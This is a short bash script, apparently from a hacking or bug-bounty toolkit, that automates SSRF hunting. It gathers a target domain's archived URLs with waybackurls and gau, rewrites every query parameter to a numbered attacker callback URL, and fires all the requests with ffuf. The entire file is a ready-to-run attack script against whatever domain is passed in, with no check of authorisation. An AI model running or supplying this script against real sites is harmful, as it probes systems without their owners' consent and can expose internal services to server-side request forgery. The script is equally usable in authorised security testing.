#!/bin/bash

DOMAIN=$1
WORKSPACE=$HACKING_RESULT/$DOMAIN/ssrf
CALLBACK="$2/ssrf/###"

if [ ! -d "$WORKSPACE" ]; then
	echo "[*] Making directory for domain"
	mkdir -p "$WORKSPACE"
fi

echo "[*] Getting WaybackURLs"
waybackurls $DOMAIN > $WORKSPACE/urls.txt

echo "[*] Getting URLs with GAU"
gau $DOMAIN >> $WORKSPACE/urls.txt

cat $WORKSPACE/urls.txt | sort | uniq | grep "?" | qsreplace $CALLBACK | awk '{gsub("%23%23%23",NR,$0);print}' > $WORKSPACE/urls_final.txt

ffuf -w $WORKSPACE/urls_final.txt -u FUZZ
